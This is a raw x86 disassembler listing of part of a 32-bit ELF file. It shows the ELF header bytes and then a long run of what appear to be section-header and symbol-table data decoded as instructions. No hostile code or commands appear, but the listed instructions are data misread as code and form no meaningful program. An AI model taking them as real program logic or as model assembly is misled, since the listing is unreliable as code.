00000000  7F45              jg 0x47
0000169B  00BC0100000000    add [ecx+eax+0x0],bh
000016A2  0000              add [eax],al
000016A4  0000              add [eax],al
000016A6  0000              add [eax],al
000016A8  1000              adc [eax],al
000016AA  0000              add [eax],al
000016AC  0000              add [eax],al
000016AE  0000              add [eax],al
000016B0  98                cwde
000016B1  0000              add [eax],al
000016B3  0001              add [ecx],al
000016B5  0000              add [eax],al
000016B7  0006              add [esi],al
000016B9  0000              add [eax],al
000016BB  00EC              add ah,ch
000016BD  840408            test [eax+ecx],al
000016C0  EC                in al,dx
000016C1  0400              add al,0x0
000016C3  001A              add [edx],bl
000016C5  0000              add [eax],al
000016C7  0000              add [eax],al
000016C9  0000              add [eax],al
000016CB  0000              add [eax],al
000016CD  0000              add [eax],al
000016CF  000400            add [eax+eax],al
000016D2  0000              add [eax],al
000016D4  0000              add [eax],al
000016D6  0000              add [eax],al
000016D8  9E                sahf
000016D9  0000              add [eax],al
000016DB  0001              add [ecx],al
000016DD  0000              add [eax],al
000016DF  0002              add [edx],al
000016E1  0000              add [eax],al
000016E3  0008              add [eax],cl
000016E5  850408            test [eax+ecx],eax
000016E8  080500001F00      or [dword 0x1f0000],al
000016EE  0000              add [eax],al
000016F0  0000              add [eax],al
000016F2  0000              add [eax],al
000016F4  0000              add [eax],al
000016F6  0000              add [eax],al
000016F8  0400              add al,0x0
000016FA  0000              add [eax],al
000016FC  0000              add [eax],al
000016FE  0000              add [eax],al
00001700  A6                cmpsb
00001701  0000              add [eax],al
00001703  0001              add [ecx],al
00001705  0000              add [eax],al
00001707  0002              add [edx],al
00001709  0000              add [eax],al
0000170B  0028              add [eax],ch
0000170D  850408            test [eax+ecx],eax
00001710  280500003400      sub [dword 0x340000],al
00001716  0000              add [eax],al
00001718  0000              add [eax],al
0000171A  0000              add [eax],al
0000171C  0000              add [eax],al
0000171E  0000              add [eax],al
00001720  0400              add al,0x0
00001722  0000              add [eax],al
00001724  0000              add [eax],al
00001726  0000              add [eax],al
00001728  B400              mov ah,0x0
0000172A  0000              add [eax],al
0000172C  0100              add [eax],eax
0000172E  0000              add [eax],al
00001730  0200              add al,[eax]
00001732  0000              add [eax],al
00001734  5C                pop esp
00001735  850408            test [eax+ecx],eax
00001738  5C                pop esp
00001739  050000C800        add eax,0xc80000
0000173E  0000              add [eax],al
00001740  0000              add [eax],al
00001742  0000              add [eax],al
00001744  0000              add [eax],al
00001746  0000              add [eax],al
00001748  0400              add al,0x0
0000174A  0000              add [eax],al
0000174C  0000              add [eax],al
0000174E  0000              add [eax],al
00001750  BE00000001        mov esi,0x1000000
00001755  0000              add [eax],al
00001757  0003              add [ebx],al
00001759  0000              add [eax],al
0000175B  00149F            add [edi+ebx*4],dl
0000175E  0408              add al,0x8
00001760  140F              adc al,0xf
00001762  0000              add [eax],al
00001764  0800              or [eax],al
00001766  0000              add [eax],al
00001768  0000              add [eax],al
0000176A  0000              add [eax],al
0000176C  0000              add [eax],al
0000176E  0000              add [eax],al
00001770  0400              add al,0x0
00001772  0000              add [eax],al
00001774  0000              add [eax],al
00001776  0000              add [eax],al
00001778  C500              lds eax,[eax]
0000177A  0000              add [eax],al
0000177C  0100              add [eax],eax
0000177E  0000              add [eax],al
00001780  0300              add eax,[eax]
00001782  0000              add [eax],al
00001784  1C9F              sbb al,0x9f
00001786  0408              add al,0x8
00001788  1C0F              sbb al,0xf
0000178A  0000              add [eax],al
0000178C  0800              or [eax],al
0000178E  0000              add [eax],al
00001790  0000              add [eax],al
00001792  0000              add [eax],al
00001794  0000              add [eax],al
00001796  0000              add [eax],al
00001798  0400              add al,0x0
0000179A  0000              add [eax],al
0000179C  0000              add [eax],al
0000179E  0000              add [eax],al
000017A0  CC                int3
000017A1  0000              add [eax],al
000017A3  0001              add [ecx],al
000017A5  0000              add [eax],al
000017A7  0003              add [ebx],al
000017A9  0000              add [eax],al
000017AB  00249F            add [edi+ebx*4],ah
000017AE  0408              add al,0x8
000017B0  240F              and al,0xf
000017B2  0000              add [eax],al
000017B4  0400              add al,0x0
000017B6  0000              add [eax],al
000017B8  0000              add [eax],al
000017BA  0000              add [eax],al
000017BC  0000              add [eax],al
000017BE  0000              add [eax],al
000017C0  0400              add al,0x0
000017C2  0000              add [eax],al
000017C4  0000              add [eax],al
000017C6  0000              add [eax],al
000017C8  D100              rol dword [eax],1
000017CA  0000              add [eax],al
000017CC  06                push es
000017CD  0000              add [eax],al
000017CF  0003              add [ebx],al
000017D1  0000              add [eax],al
000017D3  0028              add [eax],ch
000017D5  9F                lahf
000017D6  0408              add al,0x8
000017D8  280F              sub [edi],cl
000017DA  0000              add [eax],al
000017DC  C8000000          enter 0x0,0x0
000017E0  06                push es
000017E1  0000              add [eax],al
000017E3  0000              add [eax],al
000017E5  0000              add [eax],al
000017E7  000400            add [eax+eax],al
000017EA  0000              add [eax],al
000017EC  0800              or [eax],al
000017EE  0000              add [eax],al
000017F0  DA00              fiadd dword [eax]
000017F2  0000              add [eax],al
000017F4  0100              add [eax],eax
000017F6  0000              add [eax],al
000017F8  0300              add eax,[eax]
000017FA  0000              add [eax],al
000017FC  F09F              lock lahf
000017FE  0408              add al,0x8
00001800  F00F0000          lock sldt [eax]
00001804  0400              add al,0x0
00001806  0000              add [eax],al
00001808  0000              add [eax],al
0000180A  0000              add [eax],al
0000180C  0000              add [eax],al
0000180E  0000              add [eax],al
00001810  0400              add al,0x0
00001812  0000              add [eax],al
00001814  0400              add al,0x0
00001816  0000              add [eax],al
00001818  DF00              fild word [eax]
0000181A  0000              add [eax],al
0000181C  0100              add [eax],eax
0000181E  0000              add [eax],al
00001820  0300              add eax,[eax]
00001822  0000              add [eax],al
00001824  F4                hlt
00001825  9F                lahf
00001826  0408              add al,0x8
00001828  F4                hlt
00001829  0F0000            sldt [eax]
0000182C  1800              sbb [eax],al
0000182E  0000              add [eax],al
00001830  0000              add [eax],al
00001832  0000              add [eax],al
00001834  0000              add [eax],al
00001836  0000              add [eax],al
00001838  0400              add al,0x0
0000183A  0000              add [eax],al
0000183C  0400              add al,0x0
0000183E  0000              add [eax],al
00001840  E800000001        call dword 0x1001845
00001845  0000              add [eax],al
00001847  0003              add [ebx],al
00001849  0000              add [eax],al
0000184B  0020              add [eax],ah
0000184D  A004082010        mov al,[0x10200804]
00001852  0000              add [eax],al
00001854  6C                insb
00001855  0000              add [eax],al
00001857  0000              add [eax],al
00001859  0000              add [eax],al
0000185B  0000              add [eax],al
0000185D  0000              add [eax],al
0000185F  0020              add [eax],ah
00001861  0000              add [eax],al
00001863  0000              add [eax],al
00001865  0000              add [eax],al
00001867  00EE              add dh,ch
00001869  0000              add [eax],al
0000186B  0008              add [eax],cl
0000186D  0000              add [eax],al
0000186F  0003              add [ebx],al
00001871  0000              add [eax],al
00001873  008CA004088C10    add [eax+0x108c0804],cl
0000187A  0000              add [eax],al
0000187C  0800              or [eax],al
0000187E  0000              add [eax],al
00001880  0000              add [eax],al
00001882  0000              add [eax],al
00001884  0000              add [eax],al
00001886  0000              add [eax],al
00001888  0400              add al,0x0
0000188A  0000              add [eax],al
0000188C  0000              add [eax],al
0000188E  0000              add [eax],al
00001890  F30000            rep add [eax],al
00001893  0001              add [ecx],al
00001895  0000              add [eax],al
00001897  0030              add [eax],dh
00001899  0000              add [eax],al
0000189B  0000              add [eax],al
0000189D  0000              add [eax],al
0000189F  008C1000002A00    add [eax+edx+0x2a0000],cl
000018A6  0000              add [eax],al
000018A8  0000              add [eax],al
000018AA  0000              add [eax],al
000018AC  0000              add [eax],al
000018AE  0000              add [eax],al
000018B0  0100              add [eax],eax
000018B2  0000              add [eax],al
000018B4  0100              add [eax],eax
000018B6  0000              add [eax],al
000018B8  FC                cld
000018B9  0000              add [eax],al
000018BB  0001              add [ecx],al
000018BD  0000              add [eax],al
000018BF  0000              add [eax],al
000018C1  0000              add [eax],al
000018C3  0000              add [eax],al
000018C5  0000              add [eax],al
000018C7  00B610000020      add [esi+0x20000010],dh
000018CD  0000              add [eax],al
000018CF  0000              add [eax],al
000018D1  0000              add [eax],al
000018D3  0000              add [eax],al
000018D5  0000              add [eax],al
000018D7  0001              add [ecx],al
000018D9  0000              add [eax],al
000018DB  0000              add [eax],al
000018DD  0000              add [eax],al
000018DF  000B              add [ebx],cl
000018E1  0100              add [eax],eax
000018E3  0001              add [ecx],al
000018E5  0000              add [eax],al
000018E7  0000              add [eax],al
000018E9  0000              add [eax],al
000018EB  0000              add [eax],al
000018ED  0000              add [eax],al
000018EF  00D6              add dh,dl
000018F1  1000              adc [eax],al
000018F3  00D1              add cl,dl
000018F5  0000              add [eax],al
000018F7  0000              add [eax],al
000018F9  0000              add [eax],al
000018FB  0000              add [eax],al
000018FD  0000              add [eax],al
000018FF  0001              add [ecx],al
00001901  0000              add [eax],al
00001903  0000              add [eax],al
00001905  0000              add [eax],al
00001907  0017              add [edi],dl
00001909  0100              add [eax],eax
0000190B  0001              add [ecx],al
0000190D  0000              add [eax],al
0000190F  0000              add [eax],al
00001911  0000              add [eax],al
00001913  0000              add [eax],al
00001915  0000              add [eax],al
00001917  00A71100008A      add [edi-0x75ffffef],ah
0000191D  0000              add [eax],al
0000191F  0000              add [eax],al
00001921  0000              add [eax],al
00001923  0000              add [eax],al
00001925  0000              add [eax],al
00001927  0001              add [ecx],al
00001929  0000              add [eax],al
0000192B  0000              add [eax],al
0000192D  0000              add [eax],al
0000192F  002501000001      add [dword 0x1000001],ah
00001935  0000              add [eax],al
00001937  0000              add [eax],al
00001939  0000              add [eax],al
0000193B  0000              add [eax],al
0000193D  0000              add [eax],al
0000193F  0031              add [ecx],dh
00001941  1200              adc al,[eax]
00001943  004100            add [ecx+0x0],al
00001946  0000              add [eax],al
00001948  0000              add [eax],al
0000194A  0000              add [eax],al
0000194C  0000              add [eax],al
0000194E  0000              add [eax],al
00001950  0100              add [eax],eax
00001952  0000              add [eax],al
00001954  0000              add [eax],al
00001956  0000              add [eax],al
00001958  3101              xor [ecx],eax
0000195A  0000              add [eax],al
0000195C  0100              add [eax],eax
0000195E  0000              add [eax],al
00001960  3000              xor [eax],al
00001962  0000              add [eax],al
00001964  0000              add [eax],al
00001966  0000              add [eax],al
00001968  7212              jc 0x197c
0000196A  0000              add [eax],al
0000196C  8D00              lea eax,[eax]
0000196E  0000              add [eax],al
00001970  0000              add [eax],al
00001972  0000              add [eax],al
00001974  0000              add [eax],al
00001976  0000              add [eax],al
00001978  0100              add [eax],eax
0000197A  0000              add [eax],al
0000197C  0100              add [eax],eax
0000197E  0000              add [eax],al
00001980  3C01              cmp al,0x1
00001982  0000              add [eax],al
00001984  0100              add [eax],eax
00001986  0000              add [eax],al
00001988  0000              add [eax],al
0000198A  0000              add [eax],al
0000198C  0000              add [eax],al
0000198E  0000              add [eax],al
00001990  FF12              call dword near [edx]
00001992  0000              add [eax],al
00001994  3800              cmp [eax],al
00001996  0000              add [eax],al
00001998  0000              add [eax],al
0000199A  0000              add [eax],al
0000199C  0000              add [eax],al
0000199E  0000              add [eax],al
000019A0  0100              add [eax],eax
000019A2  0000              add [eax],al
000019A4  0000              add [eax],al
000019A6  0000              add [eax],al
000019A8  1100              adc [eax],eax
000019AA  0000              add [eax],al
000019AC  0300              add eax,[eax]
000019AE  0000              add [eax],al
000019B0  0000              add [eax],al
000019B2  0000              add [eax],al
000019B4  0000              add [eax],al
000019B6  0000              add [eax],al
000019B8  37                aaa
000019B9  1300              adc eax,[eax]
000019BB  004701            add [edi+0x1],al
000019BE  0000              add [eax],al
000019C0  0000              add [eax],al
000019C2  0000              add [eax],al
000019C4  0000              add [eax],al
000019C6  0000              add [eax],al
000019C8  0100              add [eax],eax
000019CA  0000              add [eax],al
000019CC  0000              add [eax],al
000019CE  0000              add [eax],al
000019D0  0100              add [eax],eax
000019D2  0000              add [eax],al
000019D4  0200              add al,[eax]
000019D6  0000              add [eax],al
000019D8  0000              add [eax],al
000019DA  0000              add [eax],al
000019DC  0000              add [eax],al
000019DE  0000              add [eax],al
000019E0  201A              and [edx],bl
000019E2  0000              add [eax],al
000019E4  80040000          add byte [eax+eax],0x0
000019E8  2300              and eax,[eax]
000019EA  0000              add [eax],al
000019EC  3300              xor eax,[eax]
000019EE  0000              add [eax],al
000019F0  0400              add al,0x0
000019F2  0000              add [eax],al
000019F4  1000              adc [eax],al
000019F6  0000              add [eax],al
000019F8  0900              or [eax],eax
000019FA  0000              add [eax],al
000019FC  0300              add eax,[eax]
000019FE  0000              add [eax],al
00001A00  0000              add [eax],al
00001A02  0000              add [eax],al
00001A04  0000              add [eax],al
00001A06  0000              add [eax],al
00001A08  A01E000006        mov al,[0x600001e]
00001A0D  0200              add al,[eax]
00001A0F  0000              add [eax],al
00001A11  0000              add [eax],al
00001A13  0000              add [eax],al
00001A15  0000              add [eax],al
00001A17  0001              add [ecx],al
00001A19  0000              add [eax],al
00001A1B  0000              add [eax],al
00001A1D  0000              add [eax],al
00001A1F  0000              add [eax],al
00001A21  0000              add [eax],al
00001A23  0000              add [eax],al
00001A25  0000              add [eax],al
00001A27  0000              add [eax],al
00001A29  0000              add [eax],al
00001A2B  0000              add [eax],al
00001A2D  0000              add [eax],al
00001A2F  0000              add [eax],al
00001A31  0000              add [eax],al
00001A33  00548104          add [ecx+eax*4+0x4],dl
00001A37  0800              or [eax],al
00001A39  0000              add [eax],al
00001A3B  0003              add [ebx],al
00001A3D  0001              add [ecx],al
00001A3F  0000              add [eax],al
00001A41  0000              add [eax],al
00001A43  006881            add [eax-0x7f],ch
00001A46  0408              add al,0x8
00001A48  0000              add [eax],al
00001A4A  0000              add [eax],al
00001A4C  0300              add eax,[eax]
00001A4E  0200              add al,[eax]
00001A50  0000              add [eax],al
00001A52  0000              add [eax],al
00001A54  888104080000      mov [ecx+0x804],al
00001A5A  0000              add [eax],al
00001A5C  0300              add eax,[eax]
00001A5E  0300              add eax,[eax]
00001A60  0000              add [eax],al
00001A62  0000              add [eax],al
00001A64  AC                lodsb
00001A65  81040800000000    add dword [eax+ecx],0x0
00001A6C  0300              add eax,[eax]
00001A6E  0400              add al,0x0
00001A70  0000              add [eax],al
00001A72  0000              add [eax],al
00001A74  CC                int3
00001A75  81040800000000    add dword [eax+ecx],0x0
00001A7C  0300              add eax,[eax]
00001A7E  0500000000        add eax,0x0
00001A83  001C82            add [edx+eax*4],bl
00001A86  0408              add al,0x8
00001A88  0000              add [eax],al
00001A8A  0000              add [eax],al
00001A8C  0300              add eax,[eax]
00001A8E  06                push es
00001A8F  0000              add [eax],al
00001A91  0000              add [eax],al
00001A93  006882            add [eax-0x7e],ch
00001A96  0408              add al,0x8
00001A98  0000              add [eax],al
00001A9A  0000              add [eax],al
00001A9C  0300              add eax,[eax]
00001A9E  07                pop es
00001A9F  0000              add [eax],al
00001AA1  0000              add [eax],al
00001AA3  00748204          add [edx+eax*4+0x4],dh
00001AA7  0800              or [eax],al
00001AA9  0000              add [eax],al
00001AAB  0003              add [ebx],al
00001AAD  0008              add [eax],cl
00001AAF  0000              add [eax],al
00001AB1  0000              add [eax],al
00001AB3  00948204080000    add [edx+eax*4+0x804],dl
00001ABA  0000              add [eax],al
00001ABC  0300              add eax,[eax]
00001ABE  0900              or [eax],eax
00001AC0  0000              add [eax],al
00001AC2  0000              add [eax],al
00001AC4  9C                pushfd
00001AC5  82                db 0x82
00001AC6  0408              add al,0x8
00001AC8  0000              add [eax],al
00001ACA  0000              add [eax],al
00001ACC  0300              add eax,[eax]
00001ACE  0A00              or al,[eax]
00001AD0  0000              add [eax],al
00001AD2  0000              add [eax],al
00001AD4  B482              mov ah,0x82
00001AD6  0408              add al,0x8
00001AD8  0000              add [eax],al
00001ADA  0000              add [eax],al
00001ADC  0300              add eax,[eax]
00001ADE  0B00              or eax,[eax]
00001AE0  0000              add [eax],al
00001AE2  0000              add [eax],al
00001AE4  F0                lock
00001AE5  82                db 0x82
00001AE6  0408              add al,0x8
00001AE8  0000              add [eax],al
00001AEA  0000              add [eax],al
00001AEC  0300              add eax,[eax]
00001AEE  0C00              or al,0x0
00001AF0  0000              add [eax],al
00001AF2  0000              add [eax],al
00001AF4  308304080000      xor [ebx+0x804],al
00001AFA  0000              add [eax],al
00001AFC  0300              add eax,[eax]
00001AFE  0D00000000        or eax,0x0
00001B03  00EC              add ah,ch
00001B05  840408            test [eax+ecx],al
00001B08  0000              add [eax],al
00001B0A  0000              add [eax],al
00001B0C  0300              add eax,[eax]
00001B0E  0E                push cs
00001B0F  0000              add [eax],al
00001B11  0000              add [eax],al
00001B13  0008              add [eax],cl
00001B15  850408            test [eax+ecx],eax
00001B18  0000              add [eax],al
00001B1A  0000              add [eax],al
00001B1C  0300              add eax,[eax]
00001B1E  0F0000            sldt [eax]
00001B21  0000              add [eax],al
00001B23  0028              add [eax],ch
00001B25  850408            test [eax+ecx],eax
00001B28  0000              add [eax],al
00001B2A  0000              add [eax],al
00001B2C  0300              add eax,[eax]
00001B2E  1000              adc [eax],al
00001B30  0000              add [eax],al
00001B32  0000              add [eax],al
00001B34  5C                pop esp
00001B35  850408            test [eax+ecx],eax
00001B38  0000              add [eax],al
00001B3A  0000              add [eax],al
00001B3C  0300              add eax,[eax]
00001B3E  1100              adc [eax],eax
00001B40  0000              add [eax],al
00001B42  0000              add [eax],al
00001B44  149F              adc al,0x9f
00001B46  0408              add al,0x8
00001B48  0000              add [eax],al
00001B4A  0000              add [eax],al
00001B4C  0300              add eax,[eax]
00001B4E  1200              adc al,[eax]
00001B50  0000              add [eax],al
00001B52  0000              add [eax],al
00001B54  1C9F              sbb al,0x9f
00001B56  0408              add al,0x8
00001B58  0000              add [eax],al
00001B5A  0000              add [eax],al
00001B5C  0300              add eax,[eax]
00001B5E  1300              adc eax,[eax]
00001B60  0000              add [eax],al
00001B62  0000              add [eax],al
00001B64  249F              and al,0x9f
00001B66  0408              add al,0x8
00001B68  0000              add [eax],al
00001B6A  0000              add [eax],al
00001B6C  0300              add eax,[eax]
00001B6E  1400              adc al,0x0
00001B70  0000              add [eax],al
00001B72  0000              add [eax],al
00001B74  289F04080000      sub [edi+0x804],bl
00001B7A  0000              add [eax],al
00001B7C  0300              add eax,[eax]
00001B7E  1500000000        adc eax,0x0
00001B83  00F0              add al,dh
00001B85  9F                lahf
00001B86  0408              add al,0x8
00001B88  0000              add [eax],al
00001B8A  0000              add [eax],al
00001B8C  0300              add eax,[eax]
00001B8E  16                push ss
00001B8F  0000              add [eax],al
00001B91  0000              add [eax],al
00001B93  00F4              add ah,dh
00001B95  9F                lahf
00001B96  0408              add al,0x8
00001B98  0000              add [eax],al
00001B9A  0000              add [eax],al
00001B9C  0300              add eax,[eax]
00001B9E  17                pop ss
00001B9F  0000              add [eax],al
00001BA1  0000              add [eax],al
00001BA3  0020              add [eax],ah
00001BA5  A004080000        mov al,[0x804]
00001BAA  0000              add [eax],al
00001BAC  0300              add eax,[eax]
00001BAE  1800              sbb [eax],al
00001BB0  0000              add [eax],al
00001BB2  0000              add [eax],al
00001BB4  8CA004080000      mov [eax+0x804],fs
00001BBA  0000              add [eax],al
00001BBC  0300              add eax,[eax]
00001BBE  1900              sbb [eax],eax
00001BC0  0000              add [eax],al
00001BC2  0000              add [eax],al
00001BC4  0000              add [eax],al
00001BC6  0000              add [eax],al
00001BC8  0000              add [eax],al
00001BCA  0000              add [eax],al
00001BCC  0300              add eax,[eax]
00001BCE  1A00              sbb al,[eax]
00001BD0  0000              add [eax],al
00001BD2  0000              add [eax],al
00001BD4  0000              add [eax],al
00001BD6  0000              add [eax],al
00001BD8  0000              add [eax],al
00001BDA  0000              add [eax],al
00001BDC  0300              add eax,[eax]
00001BDE  1B00              sbb eax,[eax]
00001BE0  0000              add [eax],al
00001BE2  0000              add [eax],al
00001BE4  0000              add [eax],al
00001BE6  0000              add [eax],al
00001BE8  0000              add [eax],al
00001BEA  0000              add [eax],al
00001BEC  0300              add eax,[eax]
00001BEE  1C00              sbb al,0x0
00001BF0  0000              add [eax],al
00001BF2  0000              add [eax],al
00001BF4  0000              add [eax],al
00001BF6  0000              add [eax],al
00001BF8  0000              add [eax],al
00001BFA  0000              add [eax],al
00001BFC  0300              add eax,[eax]
00001BFE  1D00000000        sbb eax,0x0
00001C03  0000              add [eax],al
00001C05  0000              add [eax],al
00001C07  0000              add [eax],al
00001C09  0000              add [eax],al
00001C0B  0003              add [ebx],al
00001C0D  001E              add [esi],bl
00001C0F  0000              add [eax],al
00001C11  0000              add [eax],al
00001C13  0000              add [eax],al
00001C15  0000              add [eax],al
00001C17  0000              add [eax],al
00001C19  0000              add [eax],al
00001C1B  0003              add [ebx],al
00001C1D  001F              add [edi],bl
00001C1F  0000              add [eax],al
00001C21  0000              add [eax],al
00001C23  0000              add [eax],al
00001C25  0000              add [eax],al
00001C27  0000              add [eax],al
00001C29  0000              add [eax],al
00001C2B  0003              add [ebx],al
00001C2D  0020              add [eax],ah
00001C2F  0001              add [ecx],al
00001C31  0000              add [eax],al
00001C33  0000              add [eax],al
00001C35  0000              add [eax],al
00001C37  0000              add [eax],al
00001C39  0000              add [eax],al
00001C3B  000400            add [eax+eax],al
00001C3E  F1                int1
00001C3F  FF0C00            dec dword [eax+eax]
00001C42  0000              add [eax],al
00001C44  149F              adc al,0x9f
00001C46  0408              add al,0x8
00001C48  0000              add [eax],al
00001C4A  0000              add [eax],al
00001C4C  0100              add [eax],eax
00001C4E  1200              adc al,[eax]
00001C50  1A00              sbb al,[eax]
00001C52  0000              add [eax],al
00001C54  1C9F              sbb al,0x9f
00001C56  0408              add al,0x8
00001C58  0000              add [eax],al
00001C5A  0000              add [eax],al
00001C5C  0100              add [eax],eax
00001C5E  1300              adc eax,[eax]
00001C60  2800              sub [eax],al
00001C62  0000              add [eax],al
00001C64  249F              and al,0x9f
00001C66  0408              add al,0x8
00001C68  0000              add [eax],al
00001C6A  0000              add [eax],al
00001C6C  0100              add [eax],eax
00001C6E  1400              adc al,0x0
00001C70  3500000060        xor eax,0x60000000
00001C75  83040800          add dword [eax+ecx],byte +0x0
00001C79  0000              add [eax],al
00001C7B  0002              add [edx],al
00001C7D  000D004B0000      add [dword 0x4b00],cl
00001C83  008CA004080100    add [eax+0x10804],cl
00001C8A  0000              add [eax],al
00001C8C  0100              add [eax],eax
00001C8E  1900              sbb [eax],eax
00001C90  5A                pop edx
00001C91  0000              add [eax],al
00001C93  0090A0040804      add [eax+0x40804a0],dl
00001C99  0000              add [eax],al
00001C9B  0001              add [ecx],al
00001C9D  0019              add [ecx],bl
00001C9F  006800            add [eax+0x0],ch
00001CA2  0000              add [eax],al
00001CA4  C0830408000000    rol byte [ebx+0x804],0x0
00001CAB  0002              add [edx],al
00001CAD  000D00010000      add [dword 0x100],cl
00001CB3  0000              add [eax],al
00001CB5  0000              add [eax],al
00001CB7  0000              add [eax],al
00001CB9  0000              add [eax],al
00001CBB  000400            add [eax+eax],al
00001CBE  F1                int1
00001CBF  FF740000          push dword [eax+eax+0x0]
00001CC3  0018              add [eax],bl
00001CC5  9F                lahf
00001CC6  0408              add al,0x8
00001CC8  0000              add [eax],al
00001CCA  0000              add [eax],al
00001CCC  0100              add [eax],eax
00001CCE  1200              adc al,[eax]
00001CD0  810000002086      add dword [eax],0x86200000
00001CD6  0408              add al,0x8
00001CD8  0000              add [eax],al
00001CDA  0000              add [eax],al
00001CDC  0100              add [eax],eax
00001CDE  1100              adc [eax],eax
00001CE0  8F00              pop dword [eax]
00001CE2  0000              add [eax],al
00001CE4  249F              and al,0x9f
00001CE6  0408              add al,0x8
00001CE8  0000              add [eax],al
00001CEA  0000              add [eax],al
00001CEC  0100              add [eax],eax
00001CEE  1400              adc al,0x0
00001CF0  9B0000            wait add [eax],al
00001CF3  00C0              add al,al
00001CF5  840408            test [eax+ecx],al
00001CF8  0000              add [eax],al
00001CFA  0000              add [eax],al
00001CFC  0200              add al,[eax]
00001CFE  0D00B10000        or eax,0xb100
00001D03  0000              add [eax],al
00001D05  0000              add [eax],al
00001D07  0000              add [eax],al
00001D09  0000              add [eax],al
00001D0B  000400            add [eax+eax],al
00001D0E  F1                int1
00001D0F  FF                db 0xff
00001D10  BD00000014        mov ebp,0x14000000
00001D15  9F                lahf
00001D16  0408              add al,0x8
00001D18  0000              add [eax],al
00001D1A  0000              add [eax],al
00001D1C  0000              add [eax],al
00001D1E  1200              adc al,[eax]
00001D20  CE                into
00001D21  0000              add [eax],al
00001D23  0028              add [eax],ch
00001D25  9F                lahf
00001D26  0408              add al,0x8
00001D28  0000              add [eax],al
00001D2A  0000              add [eax],al
00001D2C  0100              add [eax],eax
00001D2E  1500D70000        adc eax,0xd700
00001D33  00149F            add [edi+ebx*4],dl
00001D36  0408              add al,0x8
00001D38  0000              add [eax],al
00001D3A  0000              add [eax],al
00001D3C  0000              add [eax],al
00001D3E  1200              adc al,[eax]
00001D40  EA000000F49F04    jmp dword 0x49f:0xf4000000
00001D47  0800              or [eax],al
00001D49  0000              add [eax],al
00001D4B  0001              add [ecx],al
00001D4D  0017              add [edi],dl
00001D4F  0000              add [eax],al
00001D51  0100              add [eax],eax
00001D53  00B084040802      add [eax+0x2080484],dh
00001D59  0000              add [eax],al
00001D5B  0012              add [edx],dl
00001D5D  000D00100100      add [dword 0x11000],cl
00001D63  00B284040800      add [edx+0x80484],dh
00001D69  0000              add [eax],al
00001D6B  0012              add [edx],dl
00001D6D  020D00270100      add cl,[dword 0x12700]
00001D73  0020              add [eax],ah
00001D75  A004080000        mov al,[0x804]
00001D7A  0000              add [eax],al
00001D7C  2000              and [eax],al
00001D7E  1800              sbb [eax],al
00001D80  3201              xor al,[ecx]
00001D82  0000              add [eax],al
00001D84  0000              add [eax],al
00001D86  0000              add [eax],al
00001D88  0000              add [eax],al
00001D8A  0000              add [eax],al
00001D8C  1200              adc al,[eax]
00001D8E  0000              add [eax],al
00001D90  44                inc esp
00001D91  0100              add [eax],eax
00001D93  008CA004080000    add [eax+0x804],cl
00001D9A  0000              add [eax],al
00001D9C  1000              adc [eax],al
00001D9E  F1                int1
00001D9F  FF4B01            dec dword [ebx+0x1]
00001DA2  0000              add [eax],al
00001DA4  EC                in al,dx
00001DA5  840408            test [eax+ecx],al
00001DA8  0000              add [eax],al
00001DAA  0000              add [eax],al
00001DAC  1200              adc al,[eax]
00001DAE  0E                push cs
00001DAF  005101            add [ecx+0x1],dl
00001DB2  0000              add [eax],al
00001DB4  209F04080000      and [edi+0x804],bl
00001DBA  0000              add [eax],al
00001DBC  1102              adc [edx],eax
00001DBE  1300              adc eax,[eax]
00001DC0  5E                pop esi
00001DC1  0100              add [eax],eax
00001DC3  0020              add [eax],ah
00001DC5  A004080000        mov al,[0x804]
00001DCA  0000              add [eax],al
00001DCC  1000              adc [eax],al
00001DCE  1800              sbb [eax],al
00001DD0  6B0100            imul eax,[ecx],byte +0x0
00001DD3  0000              add [eax],al
00001DD5  0000              add [eax],al
00001DD7  0000              add [eax],al
00001DD9  0000              add [eax],al
00001DDB  0020              add [eax],ah
00001DDD  0000              add [eax],al
00001DDF  007A01            add [edx+0x1],bh
00001DE2  0000              add [eax],al
00001DE4  24A0              and al,0xa0
00001DE6  0408              add al,0x8
00001DE8  0000              add [eax],al
00001DEA  0000              add [eax],al
00001DEC  1102              adc [edx],eax
00001DEE  1800              sbb [eax],al
00001DF0  8701              xchg eax,[ecx]
00001DF2  0000              add [eax],al
00001DF4  0C85              or al,0x85
00001DF6  0408              add al,0x8
00001DF8  0400              add al,0x0
00001DFA  0000              add [eax],al
00001DFC  1100              adc [eax],eax
00001DFE  0F009601000000    lldt [esi+0x1]
00001E05  0000              add [eax],al
00001E07  0000              add [eax],al
00001E09  0000              add [eax],al
00001E0B  0012              add [edx],dl
00001E0D  0000              add [eax],al
00001E0F  00B301000040      add [ebx+0x40000001],dh
